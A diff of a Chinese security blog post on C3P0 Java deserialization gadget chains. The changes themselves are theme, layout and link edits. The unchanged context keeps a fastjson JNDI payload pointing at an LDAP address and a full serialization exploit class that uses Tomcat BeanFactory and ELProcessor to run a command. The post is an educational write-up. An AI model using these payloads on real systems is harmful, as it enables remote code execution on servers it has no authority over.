@@ -3,14 +3,28 @@
 <head>
   <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<meta name="theme-color" content="#f7f7f4">
-<meta name="color-scheme" content="light">
+<meta name="color-scheme" content="light dark">
+<meta name="theme-color" content="#f7f7f4" data-theme-color-light="#f7f7f4" data-theme-color-dark="#161614">
 
 <title>C3P0链 — CurlySean&#39;s Blog</title>
 <meta name="description" content="这里是 CurlySean 的个人技术博客，记录漏洞研究、代码审计与攻防实践，整理可以复现、验证与继续推演的技术细节。">
-<link rel="canonical" href="http://curlysean.github.io/2025/04/01/C3P0%E9%93%BE/">
+<link rel="canonical" href="https://curlysean.github.io/2025/04/01/C3P0%E9%93%BE/">
+<link rel="preload" href="/fonts/instrument-sans-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
+<link rel="preload" href="/fonts/jetbrains-mono-latin-wght-normal.woff2" as="font" type="font/woff2" crossorigin>
 <link rel="stylesheet" href="/css/style.css">
-<script>document.documentElement.classList.add('js')</script>
+<script>
+  (function () {
+    try {
+      var key = 'sheepfold-theme';
+      var saved = localStorage.getItem(key);
+      var dark = saved === 'dark' || (saved !== 'light' && window.matchMedia('(prefers-color-scheme: dark)').matches);
+      document.documentElement.setAttribute('data-theme', dark ? 'dark' : 'light');
+      document.documentElement.classList.add('js');
+    } catch (error) {
+      document.documentElement.classList.add('js');
+    }
+  })();
+</script>
 
 <meta name="generator" content="Hexo 7.3.0"></head>
 <body class="page-type-post">
@@ -37,11 +51,18 @@
         <a class="desktop-nav__link" href="/about/">关于</a>
       
     </nav>
-    <a class="header-cta" href="/archives/">开始阅读 <span aria-hidden="true">↗</span></a>
-    <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
-      <span class="sr-only">打开导航</span>
-      <span></span><span></span>
-    </button>
+    <div class="site-header__actions">
+      <button class="theme-toggle" type="button" data-theme-toggle aria-label="切换颜色模式" title="切换颜色模式">
+        <span data-theme-toggle-label>暗色</span>
+      </button>
+      
+        <a class="header-cta header-cta--ghost" href="/archives/">全部文章 <span aria-hidden="true">↗</span></a>
+      
+      <button class="menu-toggle" type="button" aria-expanded="false" aria-controls="mobile-menu" data-menu-toggle>
+        <span class="sr-only">打开导航</span>
+        <span></span><span></span>
+      </button>
+    </div>
   </div>
   <nav class="mobile-nav" id="mobile-menu" aria-label="移动端主导航" data-mobile-menu>
     <div class="frame mobile-nav__inner">
@@ -90,12 +111,6 @@
         
       </div>
     </div>
-    <div class="frame post-meta-grid reveal">
-      <div><span>发布</span><time datetime="2025-04-01T13:59:01.000Z">2025.04.01</time></div>
-      <div><span>更新</span><time datetime="2025-04-01T13:59:01.000Z">2025.04.01</time></div>
-      <div><span>阅读</span><strong>45 MIN</strong></div>
-      <div><span>标签</span><strong>1</strong></div>
-    </div>
   </header>
 
   <div class="frame post-content-layout">
@@ -103,11 +118,17 @@
       <div class="post-rail__inner">
         <p class="eyebrow">ON THIS PAGE</p>
         
-          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B9%8B-C3P0-%E9%93%BE%E5%AD%A6%E4%B9%A0"><span class="toc-text">C3P0 链</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SFzpI"><span class="toc-text">C3P0 组件介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suq0L"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#z1mJb"><span class="toc-text">Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AiWuP"><span class="toc-text">URLClassLoader攻击链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DmQbC"><span class="toc-text">分析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#LidAt"><span class="toc-text">链子尾部利用点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ixJNC"><span class="toc-text">调用referenceToObject</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#sbk9p"><span class="toc-text">调用getObject</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#WJ1UW"><span class="toc-text">小结</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fi5t9"><span class="toc-text">实现</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#HuFaA"><span class="toc-text">后续调整</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#j8FVX"><span class="toc-text">最终EXP</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NP8OE"><span class="toc-text">JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ly7DN"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#aWW6J"><span class="toc-text">JNDI注入流程</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#fewO8"><span class="toc-text">JNDI触发点</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#KDvsh"><span class="toc-text">调用dereference</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#zxcJe"><span class="toc-text">调用inner</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nNIfX"><span class="toc-text">JNDIEXP构造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mv7yR"><span class="toc-text">hexbase攻击链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XY97U"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#p2yPj"><span class="toc-text">EXP实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#g2Rbe"><span class="toc-text">不出网情况下</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rfzl8"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xg8vt"><span class="toc-text">EXP实现</span></a></li></ol></li></ol></li></ol></nav>
+          <nav class="toc" aria-label="文章目录"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#SFzpI"><span class="toc-text">C3P0 组件介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#suq0L"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#z1mJb"><span class="toc-text">Gadget</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#AiWuP"><span class="toc-text">URLClassLoader攻击链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#DmQbC"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Fi5t9"><span class="toc-text">实现</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#NP8OE"><span class="toc-text">JNDI注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Ly7DN"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#aWW6J"><span class="toc-text">JNDI注入流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nNIfX"><span class="toc-text">JNDIEXP构造</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mv7yR"><span class="toc-text">hexbase攻击链</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#XY97U"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#p2yPj"><span class="toc-text">EXP实现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#g2Rbe"><span class="toc-text">不出网情况下</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#rfzl8"><span class="toc-text">环境配置</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Xg8vt"><span class="toc-text">EXP实现</span></a></li></ol></li></ol></nav>
         
       </div>
     </aside>
     <div class="article-column">
+      <div class="post-meta-grid reveal">
+        <div><span>发布</span><time datetime="2025-04-01T13:59:01.000Z">2025.04.01</time></div>
+        <div><span>更新</span><time datetime="2025-04-01T13:59:01.000Z">2025.04.01</time></div>
+        <div><span>阅读</span><strong>约 16 分钟</strong></div>
+        <div><span>标签</span><strong>1</strong></div>
+      </div>
       <div class="article-body">
         <h1 id="Java-反序列化之-C3P0-链学习">C3P0 链</h1>
 <h2 id="SFzpI">C3P0 组件介绍</h2>
@@ -136,17 +157,17 @@ C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支�
 
 <p>接下来我们要去看，在哪里调用了<code>ReferenceableUtils#referenceToObject</code></p>
 <p><code>ReferenceIndirector</code><font style="color:rgb(80, 80, 92);"> 的</font><code>getObject</code><font style="color:rgb(80, 80, 92);">方法调用了前者</font></p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002523391-69c2f220-334e-4631-98b5-19d8bf07131f.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002523391-69c2f220-334e-4631-98b5-19d8bf07131f.png" alt="C3P0链" loading="lazy"></p>
 <h5 id="sbk9p">调用<font style="color:rgb(80, 80, 92);">getObject</font></h5>
 
 <p>继续向上找，在<code>PoolBackedDataSourceBase</code>的<code>readObject</code>方法中，调用了这里</p>
 <p>且这个方法是一个类的<code>readObject</code>方法，是一个入口</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002611257-ed1c6bdb-e7d2-4449-9149-919b5ed4f7dd.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741002611257-ed1c6bdb-e7d2-4449-9149-919b5ed4f7dd.png" alt="C3P0链" loading="lazy"></p>
 <h5 id="WJ1UW">小结</h5>
 其实这条链子非常短，也就简单的两次调用；难的是理解和调整
 
 <p>流程如下：</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741003226032-ecc5c3ba-6a73-47af-84d8-98fac13b7722.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741003226032-ecc5c3ba-6a73-47af-84d8-98fac13b7722.png" alt="C3P0链" loading="lazy"></p>
 <h4 id="Fi5t9">实现</h4>
 根据上述分析的流程，其实逻辑走下来就下面的一句话
 
@@ -210,14 +231,14 @@ C3P0是一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支�
 继续向上找，我们可以看到一堆的setter与getter方法
 
 <p>看到这里就可以想到fastjson的调用链，满足了fastjson链的调用，我们这里选择<code>setLoginTimeout</code>方法，它只需要我们传入一个整数即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741089858903-68f3d419-1a47-491b-a13f-f8cf9d452d2e.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741089858903-68f3d419-1a47-491b-a13f-f8cf9d452d2e.png" alt="C3P0链" loading="lazy"></p>
 <h4 id="nNIfX">JNDIEXP构造</h4>
 该EXP构造十分简单，和之前说的fastjson利用链的构造方法一样
 
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> C3P0;</span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">C3P0JNDI</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">payload</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;jndiName\&quot;:\&quot;ldap://127.0.0.1:8085/UpQiYDGn\&quot;,\&quot;LoginTimeout\&quot;:\&quot;1\&quot;&#125;&quot;</span>;</span><br><span class="line">        JSON.parse(payload);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <p>这里反连地址我没有自己开，可以直接使用yakit工具生成jndi反连地址，最后成功执行</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741090441099-d6b12de5-ac36-4f5b-a6be-c84d9eb2b54b.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741090441099-d6b12de5-ac36-4f5b-a6be-c84d9eb2b54b.png" alt="C3P0链" loading="lazy"></p>
 <h3 id="Mv7yR">hexbase攻击链</h3>
 <h4 id="XY97U">分析</h4>
 
@@ -263,7 +284,7 @@ URLClassLoader加载远程类，和JNDI注入，都需要目标机器能够出�
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> NoNetUsing;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;  </span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;  </span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;  </span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;  </span><br><span class="line"><span class="keyword">import</span> java.io.*;  </span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;  </span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;  </span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NoAccessEXP</span> &#123;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Loader_Ref</span> <span class="keyword">implements</span> <span class="title class_">ConnectionPoolDataSource</span>, Referenceable &#123;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> Reference <span class="title function_">getReference</span><span class="params">()</span> <span class="keyword">throws</span> NamingException &#123;  </span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);  </span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;faster=eval&quot;</span>));  </span><br><span class="line">            resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;faster&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));  </span><br><span class="line">            <span class="keyword">return</span> resourceRef;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> PooledConnection <span class="title function_">getPooledConnection</span><span class="params">(String user, String password)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> PrintWriter <span class="title function_">getLogWriter</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLogWriter</span><span class="params">(PrintWriter out)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setLoginTimeout</span><span class="params">(<span class="type">int</span> seconds)</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getLoginTimeout</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="meta">@Override</span>  </span><br><span class="line"> <span class="keyword">public</span> Logger <span class="title function_">getParentLogger</span><span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException &#123;  </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//序列化  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(ConnectionPoolDataSource c)</span> <span class="keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;  </span><br><span class="line">        <span class="comment">//反射修改connectionPoolDataSource属性值  </span></span><br><span class="line"> <span class="type">PoolBackedDataSourceBase</span> <span class="variable">poolBackedDataSourceBase</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PoolBackedDataSourceBase</span>(<span class="literal">false</span>);  </span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> poolBackedDataSourceBase.getClass();  </span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;connectionPoolDataSource&quot;</span>);  </span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);  </span><br><span class="line">        field.set(poolBackedDataSourceBase,c);  </span><br><span class="line">  </span><br><span class="line">        <span class="comment">//序列化流写入文件  </span></span><br><span class="line"> <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);  </span><br><span class="line">        oos.writeObject(poolBackedDataSourceBase);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="comment">//反序列化  </span></span><br><span class="line"> <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;ser.bin&quot;</span>));  </span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);  </span><br><span class="line">        objectInputStream.readObject();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;  </span><br><span class="line">        <span class="type">Loader_Ref</span> <span class="variable">loader_ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Loader_Ref</span>();  </span><br><span class="line">        serialize(loader_ref);  </span><br><span class="line">        unserialize();  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>这样就成功弹出了计算器</p>
-<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741684878895-1c6fa6c9-edc7-4365-a2f6-6a0ab3cf37a1.png"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/CurlySean/blogImage@main/img/1741684878895-1c6fa6c9-edc7-4365-a2f6-6a0ab3cf37a1.png" alt="C3P0链" loading="lazy"></p>
 
       </div>
       
@@ -279,13 +300,13 @@ URLClassLoader加载远程类，和JNDI注入，都需要目标机器能够出�
   <nav class="frame post-navigation" aria-label="相邻文章">
     
       <a href="/2025/04/06/SnakeYaml%E9%93%BE/">
-        <span>← PREVIOUS</span>
+        <span>更新一篇</span>
         <strong>SnakeYaml链</strong>
       </a>
     
     
-      <a href="/2025/03/29/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
-        <span>NEXT →</span>
+      <a class="post-navigation__older" href="/2025/03/29/SPEL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5/">
+        <span>更早一篇</span>
         <strong>SPEL表达式注入</strong>
       </a>
     
@@ -299,9 +320,9 @@ URLClassLoader加载远程类，和JNDI注入，都需要目标机器能够出�
       <a href="/">CURLYSEAN</a>
       <span>持续记录，保持验证。</span>
     </div>
-    <p class="site-footer__copyright">© 2026 CurlySean</p>
+    <p class="site-footer__copyright">© 2025–2026 CurlySean</p>
     <nav class="site-footer__links" aria-label="外部链接">
-      <a href="https://github.com/CurlySean" target="_blank" rel="noopener">GitHub ↗</a>
+      <a href="https://github.com/CurlySean" target="_blank" rel="noopener noreferrer">GitHub ↗</a>
       <a href="mailto:5345414e@gmail.com">Email ↗</a>
     </nav>
   </div>
